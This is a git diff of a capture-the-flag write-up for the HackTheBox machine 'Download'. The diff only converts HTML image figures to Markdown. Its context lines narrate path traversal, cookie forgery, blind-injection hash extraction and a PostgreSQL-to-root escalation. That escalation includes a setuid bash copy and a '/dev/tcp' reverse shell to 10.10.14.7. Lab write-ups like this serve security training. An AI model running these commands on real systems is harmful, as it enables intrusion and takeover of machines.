@@ -29,25 +29,25 @@ A few filtered ports and just a web service. We have to add `download.htb` to ou
 
 The website provides a file scanner service, indicating that there could be a file upload vulnerability:
 
-<figure><img src="../../.gitbook/assets/image (4138).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4138).png>)
 
 Visiting the link below brings us to a file upload page:
 
-<figure><img src="../../.gitbook/assets/image (4139).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4139).png>)
 
 Proxying traffic through Burp indicates that this is an Express based website. I attempted to upload a file, and got a unique UID and link:
 
-<figure><img src="../../.gitbook/assets/image (4140).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4140).png>)
 
 If we click the Copy Link button, a small textbox appears in the top left with the URL followed by an alert:
 
-<figure><img src="../../.gitbook/assets/image (4141).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4141).png>)
 
 I found this rather fishy because it literally creates an element in the top left. There is a file called `copy.js` which contains the code for the function, but it does not have any glaring vulnerabilities.
 
 I noted that there was a JWT like token present within the download, as well as a `.sig` cookie:
 
-<figure><img src="../../.gitbook/assets/image (4142).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4142).png>)
 
 Here's the decoded token:
 
@@ -59,7 +59,7 @@ The next thing to enumerate would be the login. I created a test user and enumer
 
 
 
-<figure><img src="../../.gitbook/assets/image (4143).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4143).png>)
 
 When we create a user, the `download_session` cookie has a bit of extra information:
 
@@ -83,7 +83,7 @@ http://download.htb/files/download/0623ba64-6749-48a4-9a08-a58658b74852
 
 Perhaps this could be used to download other files and stuff. The uploads to this website are probably being stored within a `downloads` or `uploads` folder on the machine, so I attempted some basic LFI with some Express file names, and found that `..%2fapp.js` worked:
 
-<figure><img src="../../.gitbook/assets/image (4144).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4144).png>)
 
 Here's the source code:
 
@@ -356,11 +356,11 @@ $ ./cookie-monster.js -e -f ../cookie.json -k 8929874489719802418902487651347865
 
 Using these parameters on the website returned the `/home` directory with response that looks like it works:
 
-<figure><img src="../../.gitbook/assets/image (4145).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4145).png>)
 
 I tried each character until I reached `f`, and it returned something different:
 
-<figure><img src="../../.gitbook/assets/image (4146).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4146).png>)
 
 The length of the first response was `2174`, while the second was different. Based on this, we should have exploited blind injection successfully and automation is possible. Further testing with 2 characters works as well.
 
@@ -407,11 +407,11 @@ print(password)
 
 This would slowly print out a hash value:
 
-<figure><img src="../../.gitbook/assets/image (4147).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4147).png>)
 
 When we get the full hash, we can take it to CrackStation to crack it and then use that same password to `ssh` in as `wesley`!
 
-<figure><img src="../../.gitbook/assets/image (4148).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4148).png>)
 
 ## Privilege Escalation
 
@@ -515,7 +515,7 @@ WantedBy=multi-user.target
 
 With this, we can login to the PostgreSQL server via `psql`.
 
-<figure><img src="../../.gitbook/assets/image (4149).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4149).png>)
 
 ### PostGreSQL Privileges -> Postgres Shell
 
@@ -542,7 +542,7 @@ COPY (SELECT CAST ('cp /bin/bash /tmp/sql_shell;chmod 4777 /tmp/sql_shell;'AS te
 
 After waiting for a bit, we can move laterally:
 
-<figure><img src="../../.gitbook/assets/image (4150).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4150).png>)
 
 However, we are still technically `wesley`instead of `postgres` even if the EUID changes. We can replace the command executed with a reverse shell instead:
 
@@ -552,7 +552,7 @@ COPY (SELECT CAST('bash -i >& /dev/tcp/10.10.14.7/4444 0>&1' AS text)) TO '/var/
 
 Then on a listener port, we would get a `postgres` shell:
 
-<figure><img src="../../.gitbook/assets/image (4151).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4151).png>)
 
 However, the shell dies quickly, presumably because the connection cuts out when `root` runs `su -l` again. At least I know that this works.
 
@@ -605,10 +605,10 @@ COPY (SELECT CAST('/tmp/exploit' AS text)) TO '/var/lib/postgresql/.bash_profile
 
 After waiting for a bit, the `root` flag appeared within the `/tmp` directory, confirming that it works:
 
-<figure><img src="../../.gitbook/assets/image (4153).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4153).png>)
 
 Using this, we can create another one to get a reverse shell as `root` or run `chmod u+s /bin/bash`.
 
-<figure><img src="../../.gitbook/assets/image (4154).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4154).png>)
 
 Rooted!
